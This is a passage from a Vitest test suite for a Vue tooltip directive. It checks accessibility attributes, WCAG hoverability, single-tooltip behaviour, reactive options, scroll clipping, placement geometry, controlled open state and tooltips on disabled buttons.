    // exists to fix. role="img" makes it a nameable object.
    const wrapper = mountAnchor({
      tag: 'span',
      opts: { body: 'Build failing' },
    })

    expect(el(wrapper).getAttribute('aria-label')).toBe('Build failing')
    expect(el(wrapper).getAttribute('role')).toBe('img')

    wrapper.unmount()
    // Nothing we added outlives the anchor.
    expect(document.getElementById('anchor')).toBeNull()
  })

  it('leaves a natively interactive anchor alone', () => {
    const wrapper = mountAnchor({ tag: 'button', opts: { body: 'Delete' } })
    expect(el(wrapper).getAttribute('aria-label')).toBe('Delete')
    expect(el(wrapper).hasAttribute('role')).toBe(false)
    wrapper.unmount()
  })

  it('never overwrites a role the consumer chose', () => {
    const wrapper = mountAnchor({
      tag: 'span',
      attrs: { role: 'status' },
      opts: { body: 'Build failing' },
    })
    expect(el(wrapper).getAttribute('role')).toBe('status')
    wrapper.unmount()
  })

  it('drops the role again when the tooltip stops being the name', async () => {
    const wrapper = mountAnchor({
      tag: 'span',
      opts: { body: 'Build failing' },
    })
    expect(el(wrapper).getAttribute('role')).toBe('img')

    await wrapper.setProps({ opts: { body: 'Build failing', aria: 'none' } })

    expect(el(wrapper).hasAttribute('role')).toBe(false)
    expect(el(wrapper).hasAttribute('aria-label')).toBe(false)
    wrapper.unmount()
  })
})

// ── Hoverable: WCAG 2.1 AA 1.4.13 ────────────────────────────────────────
//
// "Hoverable" is the clause that says content revealed by hover must itself
// be hoverable without disappearing. A chip that is `pointer-events: none`
// and dies on the anchor's `mouseleave` fails it by construction, and the
// concrete victim is anyone at 200% zoom who has to pan onto a clamped chip
// to read the end of the sentence.

describe('v-nb-tooltip: the chip can be hovered (WCAG 1.4.13)', () => {
  beforeEach(() => vi.useFakeTimers())
  afterEach(() => {
    vi.clearAllTimers()
    vi.useRealTimers()
    document.body.innerHTML = ''
  })

  const openAndLeave = (opts: ITooltipOptions = { body: 'Body' }) => {
    const wrapper = mountAnchor({ opts })
    el(wrapper).dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    const node = chip()
    // The pointer travels off the anchor towards the chip.
    el(wrapper).dispatchEvent(new MouseEvent('mouseleave'))
    return { wrapper, node }
  }

  it('cancels the pending hide when the pointer reaches the chip', () => {
    const { wrapper, node } = openAndLeave()

    node.dispatchEvent(new MouseEvent('mouseenter'))
    // Well past the point at which an un-hoverable chip would have gone.
    vi.advanceTimersByTime(HIDE_DELAY + HIDE_ANIMATION + 1000)
    expect(chips().length).toBe(1)

    wrapper.unmount()
  })

  it('closes again when the pointer leaves the chip', () => {
    const { wrapper, node } = openAndLeave()
    node.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(1000)

    node.dispatchEvent(new MouseEvent('mouseleave'))
    vi.advanceTimersByTime(HIDE_DELAY + HIDE_ANIMATION)
    expect(chips().length).toBe(0)

    wrapper.unmount()
  })

  it('survives the watchdog while the pointer is on the chip', () => {
    // The watchdog reaps a chip whose anchor is no longer engaged. A hovered
    // chip IS engagement: without this the chip the user is reading is torn
    // out from under the pointer two seconds in, which is the same failure
    // wearing a different hat.
    const { wrapper, node } = openAndLeave()
    node.dispatchEvent(new MouseEvent('mouseenter'))

    vi.advanceTimersByTime(5000)
    expect(chips().length).toBe(1)

    wrapper.unmount()
  })

  it('does not dismiss on a pointerdown inside the chip', () => {
    // Selecting an error code to copy is a pointerdown. The document-level
    // "the user moved on" dismiss must not fire for it.
    const { wrapper, node } = openAndLeave()
    node.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(10)

    node.dispatchEvent(new Event('pointerdown', { bubbles: true }))
    vi.advanceTimersByTime(HIDE_ANIMATION)
    expect(chips().length).toBe(1)

    // A pointerdown anywhere else still closes it.
    pointerDown()
    vi.advanceTimersByTime(HIDE_ANIMATION)
    expect(chips().length).toBe(0)

    wrapper.unmount()
  })
})

// ── One chip, always ─────────────────────────────────────────────────────

describe('v-nb-tooltip: only one chip is ever on screen', () => {
  beforeEach(() => vi.useFakeTimers())
  afterEach(() => {
    vi.clearAllTimers()
    vi.useRealTimers()
    document.body.innerHTML = ''
  })

  const Pair = defineComponent({
    render() {
      const directive = resolveDirective('nb-tooltip') as Directive
      return h('div', [
        withDirectives(h('button', { id: 'a' }, 'A'), [
          [directive, { body: 'Chip A' }],
        ]),
        withDirectives(h('button', { id: 'b' }, 'B'), [
          [directive, { body: 'Chip B' }],
        ]),
      ])
    },
  })

  it('closes a focused chip when an unrelated sibling is hovered', () => {
    // Not a nesting case: two siblings, one reached by Tab and one by mouse.
    // The old guard only closed ANCESTOR anchors, so both chips rendered and
    // a screen full of tooltips was reachable with one hand on each device.
    const wrapper = mount(Pair, {
      global: { plugins: [tooltipDirective] },
      attachTo: document.body,
    })
    const a = document.getElementById('a') as HTMLElement
    const b = document.getElementById('b') as HTMLElement

    tabTo(a)
    vi.advanceTimersByTime(1)
    expect(chips().length).toBe(1)

    b.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)

    expect(chips().length).toBe(1)
    expect(chip().textContent).toContain('Chip B')

    wrapper.unmount()
  })

  it('closes a hovered chip when an unrelated sibling takes focus', () => {
    const wrapper = mount(Pair, {
      global: { plugins: [tooltipDirective] },
      attachTo: document.body,
    })
    const a = document.getElementById('a') as HTMLElement
    const b = document.getElementById('b') as HTMLElement

    a.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    tabTo(b)
    vi.advanceTimersByTime(1)

    expect(chips().length).toBe(1)
    expect(chip().textContent).toContain('Chip B')

    wrapper.unmount()
  })

  /** A controlled anchor beside a plain one, which is the shape of any real
   *  page: an onboarding highlight pinned open somewhere, and ordinary icon
   *  buttons everywhere else. */
  const Mixed = defineComponent({
    props: {
      open: { type: Boolean, default: true },
      tick: { type: Number, default: 0 },
      report: {
        type: Function as unknown as () => (
          open: boolean,
          reason: TTooltipReason,
        ) => void,
        default: undefined,
      },
    },
    render() {
      const directive = resolveDirective('nb-tooltip') as Directive
      return h('div', { 'data-tick': this.tick }, [
        withDirectives(h('button', { id: 'pinned' }, 'Pinned'), [
          [
            directive,
            {
              body: 'Onboarding hint',
              open: this.open,
              onOpenChange: this.report,
            },
          ],
        ]),
        withDirectives(h('button', { id: 'plain' }, 'Plain'), [
          [directive, { body: 'Plain chip' }],
        ]),
      ])
    },
  })

  it('does not tear a controlled chip down because something else was hovered', async () => {
    // The one-chip rule is a rule about what the DIRECTIVE opens. A chip the
    // host pinned open is not the directive's to close, and closing it anyway
    // starts a loop: the host's `open` is still true, so the next render
    // re-opens it, which closes the chip that replaced it, and so on for as
    // long as the pointer keeps moving.
    const seen: Array<[boolean, string]> = []
    const wrapper = mount(Mixed, {
      props: {
        open: true,
        report: (open: boolean, reason: TTooltipReason) =>
          seen.push([open, reason]),
      },
      global: { plugins: [tooltipDirective] },
      attachTo: document.body,
    })
    vi.advanceTimersByTime(1)
    expect(chips().length).toBe(1)
    expect(chip().textContent).toContain('Onboarding hint')

    const plain = document.getElementById('plain') as HTMLElement
    plain.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)

    // The pinned chip is still standing, and the host was told, honestly:
    // nothing the user did was a dismissal OF THAT tooltip.
    const text = Array.from(chips()).map((n) => n.textContent ?? '')
    expect(text.some((t) => t.includes('Onboarding hint'))).toBe(true)
    expect(text.some((t) => t.includes('Plain chip'))).toBe(true)
    expect(seen).toEqual([
      [true, 'program'],
      [false, 'superseded'],
    ])

    // And it does not ping-pong. Re-render (the host left `open` alone,
    // because it decided the hint should stay) and nothing moves.
    await wrapper.setProps({ tick: 1 })
    vi.advanceTimersByTime(SHOW_DELAY)
    expect(seen).toEqual([
      [true, 'program'],
      [false, 'superseded'],
    ])
    expect(chips().length).toBe(2)

    wrapper.unmount()
  })

  it('closes the controlled chip as soon as the host honours the report', async () => {
    const seen: Array<[boolean, string]> = []
    const wrapper = mount(Mixed, {
      props: {
        open: true,
        report: (open: boolean, reason: TTooltipReason) =>
          seen.push([open, reason]),
      },
      global: { plugins: [tooltipDirective] },
      attachTo: document.body,
    })
    vi.advanceTimersByTime(1)

    const plain = document.getElementById('plain') as HTMLElement
    plain.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    expect(chips().length).toBe(2)

    // The host agrees: one chip on screen again, and the one left standing is
    // the one the user is actually pointing at.
    await wrapper.setProps({ open: false })
    expect(chips().length).toBe(1)
    expect(chip().textContent).toContain('Plain chip')

    wrapper.unmount()
  })

  it('uncontrolled anchors still yield instantly, in the same tick', () => {
    // Routing the rule through the gate must not make the close a macrotask
    // later: two chips painted for a frame is the bug this rule exists for.
    const wrapper = mount(Pair, {
      global: { plugins: [tooltipDirective] },
      attachTo: document.body,
    })
    const a = document.getElementById('a') as HTMLElement
    const b = document.getElementById('b') as HTMLElement

    a.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    b.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)

    // No extra timer advance between the two assertions.
    expect(chips().length).toBe(1)
    expect(chip().textContent).toContain('Chip B')

    wrapper.unmount()
  })
})

// ── Options are live, not frozen at mount ────────────────────────────────

describe('v-nb-tooltip: every option is reactive', () => {
  beforeEach(() => vi.useFakeTimers())
  afterEach(() => {
    vi.clearAllTimers()
    vi.useRealTimers()
    document.body.innerHTML = ''
  })

  const openHover = (wrapper: ReturnType<typeof mountAnchor>) => {
    el(wrapper).dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
  }

  it('repaints the flavour of a chip that is already open', async () => {
    const wrapper = mountAnchor({ opts: { body: 'Body', flavor: 'danger' } })
    openHover(wrapper)
    expect(chip().classList.contains('nb-tooltip-flavor-danger')).toBe(true)

    await wrapper.setProps({ opts: { body: 'Body', flavor: 'info' } })

    // The update path decided to repaint (flavour is part of the signature),
    // so it has to apply the whole appearance, not only the innerHTML.
    expect(chip().classList.contains('nb-tooltip-flavor-danger')).toBe(false)
    expect(chip().classList.contains('nb-tooltip-flavor-info')).toBe(true)
    wrapper.unmount()
  })

  it('repaints classExtra on a chip that is already open', async () => {
    const wrapper = mountAnchor({ opts: { body: 'Body', classExtra: 'wide' } })
    openHover(wrapper)
    expect(chip().classList.contains('wide')).toBe(true)

    await wrapper.setProps({ opts: { body: 'Body', classExtra: 'narrow' } })
    expect(chip().classList.contains('wide')).toBe(false)
    expect(chip().classList.contains('narrow')).toBe(true)
    // And the structural classes survive the rewrite.
    expect(chip().classList.contains('nb-tooltip')).toBe(true)
    wrapper.unmount()
  })

  it('honours followCursor when it is switched on after mount', async () => {
    const wrapper = mountAnchor({
      opts: { body: 'Body', followCursor: false },
    })
    const node = el(wrapper)
    node.dispatchEvent(
      new MouseEvent('mouseenter', { clientX: 10, clientY: 10 }),
    )
    vi.advanceTimersByTime(SHOW_DELAY)
    const born = chip().style.left

    await wrapper.setProps({ opts: { body: 'Body', followCursor: true } })
    node.dispatchEvent(
      new MouseEvent('mousemove', { clientX: 310, clientY: 10 }),
    )

    // Read from the live binding, not from the closure the mount captured.
    expect(chip().style.left).not.toBe(born)
    expect(chip().style.left).toBe('324px')
    wrapper.unmount()
  })

  it('adds and removes the opt-in tab stop as focusable changes', async () => {
    const wrapper = mountAnchor({
      tag: 'span',
      opts: { body: 'Truncated', focusable: false },
    })
    expect(el(wrapper).hasAttribute('tabindex')).toBe(false)

    await wrapper.setProps({ opts: { body: 'Truncated', focusable: true } })
    expect(el(wrapper).getAttribute('tabindex')).toBe('0')

    await wrapper.setProps({ opts: { body: 'Truncated', focusable: false } })
    expect(el(wrapper).hasAttribute('tabindex')).toBe(false)
    wrapper.unmount()
  })

  it('never removes a tabindex the consumer owns', async () => {
    const wrapper = mountAnchor({
      tag: 'span',
      attrs: { tabindex: '-1' },
      opts: { body: 'Body', focusable: true },
    })
    await wrapper.setProps({ opts: { body: 'Body', focusable: false } })
    expect(el(wrapper).getAttribute('tabindex')).toBe('-1')
    wrapper.unmount()
  })
})

// ── Drag ─────────────────────────────────────────────────────────────────

describe('v-nb-tooltip: a pointer mid-gesture is not hovering', () => {
  beforeEach(() => vi.useFakeTimers())
  afterEach(() => {
    vi.clearAllTimers()
    vi.useRealTimers()
    document.body.innerHTML = ''
  })

  it('stays shut for a pointer that arrives with a button held', () => {
    // Dragging a slider thumb, a reorder handle or a selection across a
    // toolbar must not pop a chip under the moving cursor.
    const wrapper = mountAnchor({ opts: { body: 'Body' } })
    el(wrapper).dispatchEvent(new MouseEvent('mouseenter', { buttons: 1 }))
    vi.advanceTimersByTime(SHOW_DELAY)
    expect(chips().length).toBe(0)

    // The same anchor, entered normally afterwards, still works: the guard is
    // read off the event, so a drag that ended outside the window cannot
    // leave hovering suppressed for the rest of the session.
    el(wrapper).dispatchEvent(new MouseEvent('mouseenter', { buttons: 0 }))
    vi.advanceTimersByTime(SHOW_DELAY)
    expect(chips().length).toBe(1)
    wrapper.unmount()
  })
})

// ── Occlusion by a clipping ancestor ─────────────────────────────────────
//
// A viewport-only visibility test is not enough in a shell. A row scrolled
// out of a table body, a field scrolled out of an inspector and a card
// scrolled out of a panel are all still inside the viewport and completely
// invisible, and the chip stays glued to them, floating over the panel's own
// chrome with nothing under it.

describe('v-nb-tooltip: an anchor clipped by a scroll container', () => {
  let panel: HTMLDivElement

  beforeEach(() => {
    vi.useFakeTimers()
    installRectStub()
    panel = document.createElement('div')
    panel.style.overflow = 'auto'
    document.body.appendChild(panel)
  })

  afterEach(() => {
    vi.clearAllTimers()
    vi.useRealTimers()
    restoreRectStub()
    document.body.innerHTML = ''
  })

  const open = () => {
    const wrapper = mount(Anchor, {
      props: { opts: { body: 'Body', position: 'top' } },
      global: { plugins: [tooltipDirective] },
      attachTo: panel,
    })
    const node = wrapper.element as HTMLElement
    // The panel occupies the top half of the viewport; the anchor sits inside
    // it, near the bottom.
    setRect(panel, { top: 100, left: 0, width: 400, height: 200 })
    setRect(node, { top: 260, left: 40, width: 100, height: 20 })
    node.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    return { wrapper, node }
  }

  it('opens normally while the anchor is inside its container', () => {
    const { wrapper } = open()
    expect(chips().length).toBe(1)
    wrapper.unmount()
  })

  it('takes the chip down when the anchor scrolls out of the container', () => {
    const { wrapper, node } = open()
    expect(chips().length).toBe(1)

    // The panel scrolls: the anchor is now below the panel's bottom edge and
    // clipped, but still at y=340 in a 768-high viewport, so a viewport test
    // sees nothing wrong.
    setRect(node, { top: 340, left: 40, width: 100, height: 20 })
    expect(node.getBoundingClientRect().top).toBeLessThan(window.innerHeight)
    document
      .querySelector('div')!
      .dispatchEvent(new Event('scroll', { bubbles: false }))
    vi.advanceTimersByTime(HIDE_ANIMATION)

    expect(chips().length).toBe(0)
    wrapper.unmount()
  })

  it('ignores an ancestor that does not clip', () => {
    const plain = document.createElement('div')
    plain.style.overflow = 'visible'
    document.body.appendChild(plain)
    const wrapper = mount(Anchor, {
      props: { opts: { body: 'Body', position: 'top' } },
      global: { plugins: [tooltipDirective] },
      attachTo: plain,
    })
    const node = wrapper.element as HTMLElement
    setRect(plain, { top: 100, left: 0, width: 400, height: 200 })
    setRect(node, { top: 340, left: 40, width: 100, height: 20 })
    node.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)

    // Outside the ancestor's box, but the ancestor does not clip, so the
    // anchor is genuinely visible and keeps its chip.
    expect(chips().length).toBe(1)
    wrapper.unmount()
  })
})

// ─────────────────────────────────────────────────────────────────────────
// Geometry, with real rectangles.
//
// Everything above runs in jsdom's zero-rect world, which the directive
// deliberately reads as "no layout information" so that a test environment
// does not hide its own chips. The consequence was that the placement
// arithmetic (flip, clamp, arrow re-aim) was never executed by a single
// spec, and a side-class desync survived a whole review cycle: a chip that
// flipped top -> bottom at a panel edge and then scrolled back into open
// space was repositioned ABOVE its anchor while keeping the class that draws
// its arrow on the top edge, pointing away from the thing it labels.
//
// These specs stub both halves of the arithmetic: the anchor's rect AND the
// chip's, because a chip with no width can never fail to fit and so can
// never flip.
// ─────────────────────────────────────────────────────────────────────────

type TBox = { top: number; left: number; width: number; height: number }

const boxes = new WeakMap<Element, TBox>()
/** Default chip size: about 55 characters at the chip's font size. */
let chipBox: TBox = { top: 0, left: 0, width: 120, height: 40 }
let realRectFn: typeof Element.prototype.getBoundingClientRect

const asRect = (b: TBox): DOMRect =>
  ({
    ...b,
    bottom: b.top + b.height,
    right: b.left + b.width,
    x: b.left,
    y: b.top,
    toJSON: () => b,
  }) as DOMRect

const stubGeometry = () => {
  realRectFn = Element.prototype.getBoundingClientRect
  Element.prototype.getBoundingClientRect = function (this: Element) {
    const own = boxes.get(this)
    if (own) return asRect(own)
    // Every chip reports the same size unless a spec says otherwise. Chips
    // are created by the directive, so a spec cannot register them up front.
    if (this.classList?.contains('nb-tooltip')) return asRect(chipBox)
    return asRect({ top: 0, left: 0, width: 0, height: 0 })
  }
}

const restoreGeometry = () => {
  Element.prototype.getBoundingClientRect = realRectFn
}

const box = (node: Element, b: TBox) => boxes.set(node, b)

/** Re-run placement the way a scrolled panel does. */
const nudgeLayout = () => window.dispatchEvent(new Event('resize'))

const sideOf = (node: HTMLElement) =>
  (['top', 'bottom', 'left', 'right', 'cursor'] as const).find((s) =>
    node.classList.contains(`nb-tooltip-${s}`),
  )

describe('v-nb-tooltip: placement against real geometry', () => {
  beforeEach(() => {
    vi.useFakeTimers()
    stubGeometry()
    chipBox = { top: 0, left: 0, width: 120, height: 40 }
  })
  afterEach(() => {
    vi.clearAllTimers()
    vi.useRealTimers()
    restoreGeometry()
    document.body.innerHTML = ''
  })

  const openAt = (b: TBox, opts: ITooltipOptions = { body: 'Body' }) => {
    const wrapper = mountAnchor({ opts: { position: 'top', ...opts } })
    const node = el(wrapper)
    box(node, b)
    node.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    return { wrapper, node }
  }

  it('flips to the side that fits when the requested one does not', () => {
    // 10px from the top of the viewport: a 40px chip plus its gap cannot go
    // above this anchor. Bottom can.
    const { wrapper } = openAt({ top: 10, left: 400, width: 40, height: 20 })

    expect(sideOf(chip())).toBe('bottom')
    // rect.bottom (30) + gap (4).
    expect(chip().style.top).toBe('34px')

    wrapper.unmount()
  })

  it('flips BACK when the anchor scrolls into space where the requested side fits again', () => {
    // The regression. A chip that flipped once used to keep the flipped
    // class forever, because the class was only rewritten when the chosen
    // side DIFFERED from the requested one, and "differs" is false on the
    // way back.
    const { wrapper, node } = openAt({
      top: 10,
      left: 400,
      width: 40,
      height: 20,
    })
    expect(sideOf(chip())).toBe('bottom')

    // The panel scrolls: the same anchor is now in open space.
    box(node, { top: 400, left: 400, width: 40, height: 20 })
    nudgeLayout()

    // Placed above the anchor: 400 - (40 + 8).
    expect(chip().style.top).toBe('352px')
    // ...and the arrow is on the edge that faces the anchor. The two must
    // agree, or the chip points at nothing.
    expect(sideOf(chip())).toBe('top')
    expect(chip().classList.contains('nb-tooltip-bottom')).toBe(false)

    wrapper.unmount()
  })

  it('keeps flipping as the anchor moves, in both directions, without drift', () => {
    const { wrapper, node } = openAt({
      top: 400,
      left: 400,
      width: 40,
      height: 20,
    })
    const seen: Array<string | undefined> = [sideOf(chip())]

    for (const top of [10, 400, 12, 500]) {
      box(node, { top, left: 400, width: 40, height: 20 })
      nudgeLayout()
      seen.push(sideOf(chip()))
    }

    expect(seen).toEqual(['top', 'bottom', 'top', 'bottom', 'top'])
    // Exactly one side class at any moment.
    expect(
      ['top', 'bottom', 'left', 'right'].filter((s) =>
        chip().classList.contains(`nb-tooltip-${s}`),
      ).length,
    ).toBe(1)

    wrapper.unmount()
  })

  it('walks past the opposite side to an orthogonal one', () => {
    // A chip too tall for either vertical side, against the left edge: the
    // opposite side is no better than the requested one, so placement has to
    // keep walking. An implementation that only tries the opposite would
    // leave this chip half off the top of the window.
    chipBox = { top: 0, left: 0, width: 120, height: 700 }
    const { wrapper } = openAt({ top: 380, left: 12, width: 40, height: 20 })

    expect(sideOf(chip())).toBe('right')
    // rect.right (52) + gap (4).
    expect(chip().style.left).toBe('56px')

    wrapper.unmount()
  })

  it('clamps to the viewport and re-aims the arrow when nothing fits', () => {
    // A chip too wide for any side. The clamp is the backstop, and without
    // the arrow re-aim the caret would sit at the chip's centre, which is no
    // longer anywhere near the anchor.
    chipBox = { top: 0, left: 0, width: 1000, height: 40 }
    const { wrapper } = openAt({ top: 300, left: 500, width: 40, height: 20 })

    expect(chip().style.left).toBe('16px')
    expect(sideOf(chip())).toBe('top')
    // The anchor's centre is at 520, the chip starts at 16: 504/1000.
    expect(chip().style.getPropertyValue('--nb-tooltip-arrow-offset')).toBe(
      '50.4%',
    )

    wrapper.unmount()
  })

  it('re-places, and can flip, when the content changes while open', async () => {
    const wrapper = mountAnchor({ opts: { position: 'top', body: 'Short' } })
    const node = el(wrapper)
    box(node, { top: 100, left: 400, width: 40, height: 20 })
    node.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    expect(sideOf(chip())).toBe('top')

    // The body grew to a paragraph, which no longer fits above the anchor.
    chipBox = { top: 0, left: 0, width: 120, height: 200 }
    await wrapper.setProps({
      opts: { position: 'top', body: 'A much longer explanation' },
    })

    expect(sideOf(chip())).toBe('bottom')
    expect(chip().classList.contains('nb-tooltip-top')).toBe(false)
    // The tone and any extra classes survive a re-place.
    wrapper.unmount()
  })

  it('leaves a cursor-anchored chip on the pointer', () => {
    const wrapper = mountAnchor({ opts: { body: 'Body', position: 'cursor' } })
    const node = el(wrapper)
    box(node, { top: 400, left: 400, width: 40, height: 20 })
    node.dispatchEvent(
      new MouseEvent('mouseenter', { clientX: 300, clientY: 300 }),
    )
    vi.advanceTimersByTime(SHOW_DELAY)

    expect(sideOf(chip())).toBe('cursor')
    expect(chip().style.left).toBe('314px')

    // A scroll must not teleport it onto the element: the pointer is its
    // anchor, and the pointer cannot move without saying so.
    box(node, { top: 100, left: 400, width: 40, height: 20 })
    nudgeLayout()
    expect(chip().style.left).toBe('314px')
    expect(sideOf(chip())).toBe('cursor')

    wrapper.unmount()
  })
})

describe('v-nb-tooltip: opening it without a mouse', () => {
  beforeEach(() => vi.useFakeTimers())
  afterEach(() => {
    vi.clearAllTimers()
    vi.useRealTimers()
    document.body.innerHTML = ''
  })

  it('opens on mount when open is true, with no gesture at all', () => {
    const wrapper = mountAnchor({ opts: { body: 'Body', open: true } })
    vi.advanceTimersByTime(1)

    expect(chips().length).toBe(1)
    wrapper.unmount()
  })

  it('is controlled: the pointer reports, it does not decide', async () => {
    const seen: Array<[boolean, string]> = []
    const wrapper = mountAnchor({
      opts: {
        body: 'Body',
        open: false,
        onOpenChange: (open: boolean, reason: string) =>
          seen.push([open, reason]),
      },
    })
    const node = el(wrapper)

    node.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    // Nothing on screen: the host owns visibility. But the gesture was
    // reported, which is how the host knows to flip its own state.
    expect(chips().length).toBe(0)
    expect(seen).toEqual([[true, 'pointer']])

    await wrapper.setProps({
      opts: {
        body: 'Body',
        open: true,
        onOpenChange: (open: boolean, reason: string) =>
          seen.push([open, reason]),
      },
    })
    vi.advanceTimersByTime(1)
    expect(chips().length).toBe(1)
    expect(seen[seen.length - 1]).toEqual([true, 'program'])

    await wrapper.setProps({
      opts: {
        body: 'Body',
        open: false,
        onOpenChange: (open: boolean, reason: string) =>
          seen.push([open, reason]),
      },
    })
    vi.advanceTimersByTime(HIDE_ANIMATION)
    expect(chips().length).toBe(0)
    expect(seen[seen.length - 1]).toEqual([false, 'program'])

    wrapper.unmount()
  })

  it('defaultOpen shows once and then behaves like any other tooltip', () => {
    const wrapper = mountAnchor({ opts: { body: 'Body', defaultOpen: true } })
    vi.advanceTimersByTime(1)
    expect(chips().length).toBe(1)

    const node = el(wrapper)
    node.dispatchEvent(new MouseEvent('mouseleave'))
    vi.advanceTimersByTime(HIDE_DELAY + HIDE_ANIMATION)
    expect(chips().length).toBe(0)

    // Uncontrolled from here: hover opens it again.
    node.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    expect(chips().length).toBe(1)

    wrapper.unmount()
  })

  it('reports one transition per transition, not one per event', () => {
    const seen: Array<[boolean, string]> = []
    const wrapper = mountAnchor({
      opts: {
        body: 'Body',
        onOpenChange: (open: boolean, reason: string) =>
          seen.push([open, reason]),
      },
    })
    const node = el(wrapper)

    node.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    node.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    expect(seen).toEqual([[true, 'pointer']])

    node.dispatchEvent(new MouseEvent('mouseleave'))
    vi.advanceTimersByTime(HIDE_DELAY + HIDE_ANIMATION)
    node.dispatchEvent(new MouseEvent('mouseleave'))
    vi.advanceTimersByTime(HIDE_DELAY + HIDE_ANIMATION)
    expect(seen).toEqual([
      [true, 'pointer'],
      [false, 'pointer'],
    ])

    wrapper.unmount()
  })
})

describe('v-nb-tooltip: disabled controls', () => {
  let host: HTMLDivElement

  const DisabledHost = defineComponent({
    props: {
      opts: {
        type: Object as () => ITooltipOptions | undefined,
        required: false,
        default: undefined,
      },
      disabled: { type: Boolean, default: true },
    },
    render() {
      return h('div', { id: 'row' }, [
        withDirectives(
          h('button', { id: 'anchor', disabled: this.disabled }, 'Publish'),
          [[resolveDirective('nb-tooltip') as Directive, this.opts]],
        ),
      ])
    },
  })

  beforeEach(() => {
    vi.useFakeTimers()
    stubGeometry()
    chipBox = { top: 0, left: 0, width: 120, height: 40 }
    host = document.createElement('div')
    document.body.appendChild(host)
  })
  afterEach(() => {
    vi.clearAllTimers()
    vi.useRealTimers()
    restoreGeometry()
    document.body.innerHTML = ''
  })

  const mountDisabled = (opts: ITooltipOptions, disabled = true) =>
    mount(DisabledHost, {
      props: { opts, disabled },
      global: { plugins: [tooltipDirective] },
      attachTo: host,
    })

  const overAnchor = (row: HTMLElement) =>
    row.dispatchEvent(
      new MouseEvent('mousemove', {
        bubbles: true,
        clientX: 110,
        clientY: 305,
      }),
    )
  const awayFromAnchor = (row: HTMLElement) =>
    row.dispatchEvent(
      new MouseEvent('mousemove', {
        bubbles: true,
        clientX: 700,
        clientY: 700,
      }),
    )

  it('explains why a disabled button is disabled', () => {
    // The whole point. A native-disabled control fires no mouse events, so
    // every listener on the anchor itself is dead, and "why is this greyed
    // out?" is one of the two things people reach for a tooltip to answer.
    const wrapper = mountDisabled({
      body: 'Add a payment method first',
      position: 'top',
    })
    const node = document.getElementById('anchor') as HTMLButtonElement
    const row = document.getElementById('row') as HTMLElement
    expect(node.disabled).toBe(true)
    box(node, { top: 300, left: 100, width: 40, height: 20 })

    // Note what is NOT asserted here: that a mouseenter on the anchor does
    // nothing. jsdom dispatches events on disabled controls quite happily,
    // so asserting the browser's suppression would only be asserting jsdom.
    // What is asserted is the half we control: the escalation to the parent,
    // which is the only path a real browser leaves open.
    //
    // The parent hears the move, and the pointer is inside the anchor's box.
    overAnchor(row)
    vi.advanceTimersByTime(SHOW_DELAY)
    expect(chips().length).toBe(1)
    expect(chip().textContent).toContain('Add a payment method first')

    awayFromAnchor(row)
    vi.advanceTimersByTime(HIDE_DELAY + HIDE_ANIMATION)
    expect(chips().length).toBe(0)

    wrapper.unmount()
  })

  it('drops the escalation when the control is enabled again', async () => {
    const wrapper = mountDisabled({ body: 'Reason', position: 'top' })
    const row = document.getElementById('row') as HTMLElement
    const node = document.getElementById('anchor') as HTMLButtonElement
    box(node, { top: 300, left: 100, width: 40, height: 20 })

    await wrapper.setProps({ disabled: false })
    overAnchor(row)
    vi.advanceTimersByTime(SHOW_DELAY)
    // Enabled controls answer for themselves; a second listener would open
    // the chip twice and hide it on the first crossing of a sibling.
    expect(chips().length).toBe(0)

    node.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    expect(chips().length).toBe(1)

    wrapper.unmount()
  })

  it('leaves nothing on the parent after unmount', () => {
    const wrapper = mountDisabled({ body: 'Reason' })
    const row = document.getElementById('row') as HTMLElement
    const detached = row
    wrapper.unmount()
    // No listener, no chip, no throw.
    detached.dispatchEvent(
      new MouseEvent('mousemove', {
        bubbles: true,
        clientX: 110,
        clientY: 305,
      }),
    )
    vi.advanceTimersByTime(SHOW_DELAY)
    expect(chips().length).toBe(0)
  })
})

describe('v-nb-tooltip: tone', () => {
  beforeEach(() => vi.useFakeTimers())
  afterEach(() => {
    vi.clearAllTimers()
    vi.useRealTimers()
    document.body.innerHTML = ''
  })

  const openWith = (opts: ITooltipOptions) => {
    const wrapper = mountAnchor({ opts })
    el(wrapper).dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    return wrapper
  }

  it('paints the status the library vocabulary already uses', () => {
    // `warning` and `success` used to type-check as `string` and produce an
    // unstyled chip, because neither existed in the stylesheet.
    const wrapper = openWith({ body: 'Body', status: 'warning' })
    expect(chip().classList.contains('nb-tooltip-flavor-warning')).toBe(true)
    wrapper.unmount()
  })

  it('still honours the deprecated flavor, and lets status win', () => {
    const legacy = openWith({ body: 'Body', flavor: 'danger' })
    expect(chip().classList.contains('nb-tooltip-flavor-danger')).toBe(true)
    legacy.unmount()

    const both = openWith({ body: 'Body', flavor: 'danger', status: 'info' })
    expect(chip().classList.contains('nb-tooltip-flavor-info')).toBe(true)
